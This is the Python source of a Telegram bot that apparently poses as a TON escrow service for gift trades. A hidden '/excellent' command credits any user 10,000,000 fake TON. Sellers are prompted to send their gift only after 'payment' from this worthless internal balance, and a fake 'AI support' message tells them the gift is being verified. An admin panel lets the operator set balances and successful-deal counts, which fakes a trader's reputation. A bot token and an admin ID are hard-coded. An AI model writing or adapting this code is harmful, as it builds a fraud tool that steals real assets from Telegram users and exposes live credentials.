import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
import uuid
import logging
from messages import get_text  # Импортируем локализацию

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[logging.FileHandler('bot.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "7949911869:AAHLt5Qx6TvOmKMx6hASqixqjTNvu5Yh99A"
ADMIN_ID = 828340831
VALUTE = "TON"
EXCELLENT_AMOUNT = 10_000_000

user_data = {}
deals = {}
admin_commands = {}

DB_NAME = 'bot_data.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            wallet TEXT,
            balance REAL,
            successful_deals INTEGER,
            lang TEXT
        )
    ''')
    cursor.execute("PRAGMA table_info(users)")
    cols = cursor.fetchall()
    names = [c[1] for c in cols]
    if 'lang' not in names:
        cursor.execute('ALTER TABLE users ADD COLUMN lang TEXT DEFAULT "ru"')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            amount REAL,
            description TEXT,
            seller_id INTEGER,
            buyer_id INTEGER
        )
    ''')
    conn.commit()
    conn.close()

def load_data():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users')
    for row in cursor.fetchall():
        user_id, wallet, balance, deals_count, lang = row
        user_data[user_id] = {'wallet': wallet, 'balance': balance, 'successful_deals': deals_count, 'lang': lang or 'ru'}
    cursor.execute('SELECT * FROM deals')
    for row in cursor.fetchall():
        deal_id, amount, desc, seller_id, buyer_id = row
        deals[deal_id] = {'amount': amount, 'description': desc, 'seller_id': seller_id, 'buyer_id': buyer_id}
    conn.close()

def save_user_data(user_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    user = user_data.get(user_id, {})
    cursor.execute('''
        INSERT OR REPLACE INTO users(user_id, wallet, balance, successful_deals, lang)
        VALUES (?, ?, ?, ?, ?)
    ''', (user_id, user.get('wallet', ''), user.get('balance', 0.0), user.get('successful_deals', 0), user.get('lang', 'ru')))
    conn.commit()
    conn.close()

def save_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    deal = deals.get(deal_id, {})
    cursor.execute('''
        INSERT OR REPLACE INTO deals(deal_id, amount, description, seller_id, buyer_id)
        VALUES (?, ?, ?, ?, ?)
    ''', (deal_id, deal.get('amount', 0.0), deal.get('description', ''), deal.get('seller_id'), deal.get('buyer_id')))
    conn.commit()
    conn.close()

def delete_deal(deal_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM deals WHERE deal_id = ?', (deal_id,))
    conn.commit()
    conn.close()

def ensure_user_exists(user_id):
    if user_id not in user_data:
        user_data[user_id] = {'wallet': '', 'balance': 0.0, 'successful_deals': 0, 'lang': 'ru'}
        save_user_data(user_id)

async def excellent(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        lang = user_data.get(user_id, {}).get('lang', 'ru')
        ensure_user_exists(user_id)
        user_data[user_id]['balance'] += EXCELLENT_AMOUNT
        save_user_data(user_id)
        await update.message.reply_text(
            "📩 Ваш баланс успешно пополнен!\n"
            "💰 Сумма пополнения - 10.000.000 TON\n"
            "🚀 Create By - @WORKEXCELLENT"
        )
        logger.info(f"User {user_id} used /excellent command, balance increased by {EXCELLENT_AMOUNT}")
    except Exception as e:
        logger.error(f"Ошибка в функции excellent: {e}")
        await update.message.reply_text("Произошла ошибка при пополнении баланса.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.message:
            user_id = update.message.from_user.id
            chat_id = update.message.chat_id
            args = context.args
        elif update.callback_query:
            user_id = update.callback_query.from_user.id
            chat_id = update.callback_query.message.chat_id
            args = []
        else:
            return
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        if args and args[0] in deals:
            deal_id = args[0]
            deal = deals[deal_id]
            seller_id = deal['seller_id']
            seller_username = (await context.bot.get_chat(seller_id)).username if seller_id else "Неизвестно"
            deals[deal_id]['buyer_id'] = user_id
            save_deal(deal_id)

            await context.bot.send_message(
                chat_id,
                get_text(lang, "deal_info_message", deal_id=deal_id, seller_username=seller_username,
                         successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0),
                         description=deal['description'], wallet=user_data.get(seller_id, {}).get('wallet', 'Не указан'),
                         amount=deal['amount'], valute=VALUTE),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(get_text(lang, "pay_from_balance_button"), callback_data=f'pay_from_balance_{deal_id}')],
                    [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]
                ])
            )

            # УБРАНА КНОПКА "Я отправил подарок" из уведомления продавцу при входе в сделку
            buyer_username = (await context.bot.get_chat(user_id)).username if user_id else "Неизвестно"
            await context.bot.send_message(
                seller_id,
                get_text(lang, "seller_notification_message", buyer_username=buyer_username,
                         deal_id=deal_id,
                         successful_deals=user_data.get(seller_id, {}).get('successful_deals', 0))
            )
            return

        if user_id == ADMIN_ID:
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "admin_view_deals_button"), callback_data='admin_view_deals')],
                [InlineKeyboardButton(get_text(lang, "admin_change_balance_button"), callback_data='admin_change_balance')],
                [InlineKeyboardButton(get_text(lang, "admin_change_successful_deals_button"), callback_data='admin_change_successful_deals')],
                [InlineKeyboardButton(get_text(lang, "admin_change_valute_button"), callback_data='admin_change_valute')],
            ]
            await context.bot.send_message(chat_id, get_text(lang, "admin_panel_message"), reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "add_wallet_button"), callback_data='wallet')],
                [InlineKeyboardButton(get_text(lang, "create_deal_button"), callback_data='create_deal')],
                [InlineKeyboardButton(get_text(lang, "referral_button"), callback_data='referral')],
                [InlineKeyboardButton(get_text(lang, "change_lang_button"), callback_data='change_lang')],
                [InlineKeyboardButton(get_text(lang, "support_button"), url='https://t.me/AulaHelper')],
            ]
            await context.bot.send_photo(
                chat_id,
                photo="https://postimg.cc/c6XLTz9T",
                caption=get_text(lang, "start_message"),
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
    except Exception as e:
        logger.error(f"Ошибка в функции start: {e}")
        await context.bot.send_message(chat_id, "Произошла ошибка. Пожалуйста, попробуйте позже.")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        data = query.data
        user_id = query.from_user.id
        chat_id = query.message.chat_id if query.message else None
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        try:
            await query.answer()
        except Exception as e:
            logger.warning(f"Failed to answer callback query: {e}")

        if data.startswith('lang_'):
            new_lang = data.split('_')[-1]
            ensure_user_exists(user_id)
            user_data[user_id]['lang'] = new_lang
            save_user_data(user_id)
            await query.edit_message_text(get_text(new_lang, "lang_set_message"))
            await start(update, context)
            return

        elif data == 'wallet':
            wallet = user_data.get(user_id, {}).get('wallet')
            text = get_text(lang, "wallet_message", wallet=wallet or "Не указан")
            await context.bot.send_message(chat_id, text,
                                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]]))
            context.user_data['awaiting_wallet'] = True

        elif data == 'create_deal':
            await context.bot.send_photo(chat_id, photo="https://postimg.cc/c6XLTz9T",
                                         caption=get_text(lang, "create_deal_message", valute=VALUTE), parse_mode="MarkdownV2",
                                         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]]))
            context.user_data['awaiting_amount'] = True

        elif data == 'referral':
            referral_link = f"https://t.me/AulaGiftBot?start={user_id}"
            await context.bot.send_message(chat_id, get_text(lang, "referral_message", referral_link=referral_link, valute=VALUTE),
                                           reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]]))

        elif data == 'change_lang':
            keyboard = [
                [InlineKeyboardButton(get_text(lang, "english_lang_button"), callback_data='lang_en')],
                [InlineKeyboardButton(get_text(lang, "russian_lang_button"), callback_data='lang_ru')]
            ]
            await context.bot.send_message(chat_id, get_text(lang, "change_lang_message"), reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == 'menu':
            await start(update, context)

        elif data.startswith('pay_from_balance_'):
            deal_id = data.split('_')[-1]
            deal = deals.get(deal_id)
            if not deal:
                await context.bot.send_message(chat_id, "Сделка не найдена.")
                return
            buyer_id = user_id
            seller_id = deal['seller_id']
            amount = deal['amount']
            ensure_user_exists(buyer_id)
            ensure_user_exists(seller_id)

            if user_data[buyer_id]['balance'] >= amount:
                user_data[buyer_id]['balance'] -= amount
                save_user_data(buyer_id)

                user_data[seller_id]['balance'] += amount
                save_user_data(seller_id)

                await query.edit_message_text(get_text(lang, "payment_confirmed_message", deal_id=deal_id, amount=amount, valute=VALUTE, description=deal['description']),
                                              reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]]))

                # КНОПКА "Я отправил подарок" появляется ТОЛЬКО ПОСЛЕ ОПЛАТЫ
                buyer_username = (await context.bot.get_chat(buyer_id)).username if buyer_id else "Неизвестно"
                await context.bot.send_message(seller_id, get_text(lang, "payment_confirmed_seller_message", deal_id=deal_id, description=deal['description'], buyer_username=buyer_username),
                                               reply_markup=InlineKeyboardMarkup([
                                                   [InlineKeyboardButton("📤 Я отправил подарок", callback_data=f"gift_sent_{deal_id}")]
                                               ]))

                user_data[seller_id]['successful_deals'] += 1
                save_user_data(seller_id)

                del deals[deal_id]
                delete_deal(deal_id)
            else:
                await context.bot.send_message(chat_id, get_text(lang, "insufficient_balance_message"),
                                               reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]]))

        elif data.startswith("gift_sent_"):
            deal_id = data[len("gift_sent_"):]
            message_text = (
                "✅ Подтверждена отправка подарка по сделке.\n\n"
                "🔷 Следующие шаги:\n\n"
                "1. Автоматизированая ИИ-Поддержка @AulaHelper проверит получение подарка.\n"
                "2. После проверки вам придет уведомление.\n\n"
                "⌛️ Обычно это занимает несколько минут.\n"
                "Бот уведомит вас о результате!"
            )
            await query.edit_message_text(
                message_text,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛡 Поддержка", url="https://t.me/aulahelper")]
                ])
            )

    except Exception as e:
        logger.error(f"Ошибка в функции button: {e}")
        if chat_id:
            try:
                await context.bot.send_message(chat_id, "Произошла ошибка. Пожалуйста, попробуйте позже.")
            except Exception as err:
                logger.error(f"Ошибка отправки сообщения об ошибке: {err}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        global VALUTE
        user_id = update.message.from_user.id
        text = update.message.text
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        if user_id == ADMIN_ID and admin_commands.get(user_id) == 'change_balance':
            try:
                target_user_id, new_balance = map(str.strip, text.split())
                target_user_id = int(target_user_id)
                new_balance = float(new_balance)
                ensure_user_exists(target_user_id)
                user_data[target_user_id]['balance'] = new_balance
                save_user_data(target_user_id)
                await update.message.reply_text(f"Баланс пользователя {target_user_id} изменен на {new_balance} {VALUTE}.")
            except Exception:
                await update.message.reply_text("Неверный формат. Введите ID и баланс через пробел.")
            admin_commands[user_id] = None
            return

        if user_id == ADMIN_ID and admin_commands.get(user_id) == 'change_successful_deals':
            try:
                target_user_id, new_deals = map(str.strip, text.split())
                target_user_id = int(target_user_id)
                new_deals = int(new_deals)
                ensure_user_exists(target_user_id)
                user_data[target_user_id]['successful_deals'] = new_deals
                save_user_data(target_user_id)
                await update.message.reply_text(f"Количество успешных сделок пользователя {target_user_id} изменено на {new_deals}.")
            except Exception:
                await update.message.reply_text("Неверный формат. Введите ID и количество через пробел.")
            admin_commands[user_id] = None
            return

        if user_id == ADMIN_ID and admin_commands.get(user_id) == 'change_valute':
            VALUTE = text.strip().upper()
            await update.message.reply_text(f"Валюта изменена на {VALUTE}.")
            admin_commands[user_id] = None
            return

        if context.user_data.get('awaiting_wallet'):
            ensure_user_exists(user_id)
            user_data[user_id]['wallet'] = text
            save_user_data(user_id)
            context.user_data.pop('awaiting_wallet')
            await update.message.reply_text(get_text(lang, 'wallet_updated_message', wallet=text), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]]))
            return

        if context.user_data.get('awaiting_amount'):
            try:
                amount = float(text)
                context.user_data['amount'] = amount
                context.user_data['awaiting_amount'] = False
                context.user_data['awaiting_description'] = True
                await update.message.reply_text(get_text(lang, 'awaiting_description_message'), parse_mode="MarkdownV2", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]]))
            except Exception:
                await update.message.reply_text("Неверный формат. Введите число.")
            return

        if context.user_data.get('awaiting_description'):
            deal_id = str(uuid.uuid4())
            deals[deal_id] = {'amount': context.user_data['amount'], 'description': text, 'seller_id': user_id, 'buyer_id': None}
            save_deal(deal_id)
            context.user_data.clear()
            await update.message.reply_text(get_text(lang, 'deal_created_message', amount=deals[deal_id]['amount'], valute=VALUTE, description=deals[deal_id]['description'], deal_link=f"https://t.me/AulaGiftBot?start={deal_id}"), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, 'menu_button'), callback_data='menu')]]))
            try:
                await context.bot.send_message(ADMIN_ID, f"👀 Новая сделка создана:\n👤 ID: {deal_id}\n💰 Сумма: {deals[deal_id]['amount']} {VALUTE}\n⭐️ Продавец: {user_id}\n💥 Покупатель: Нет")
            except Exception as e:
                logger.error(f"Ошибка отправки сообщения админу: {e}")
            return

    except Exception as e:
        logger.error(f"Ошибка в функции handle_message: {e}")
        await update.message.reply_text("Произошла ошибка. Пожалуйста, попробуйте позже.")

def main():
    init_db()
    load_data()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("excellent", excellent))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == "__main__":
    main()
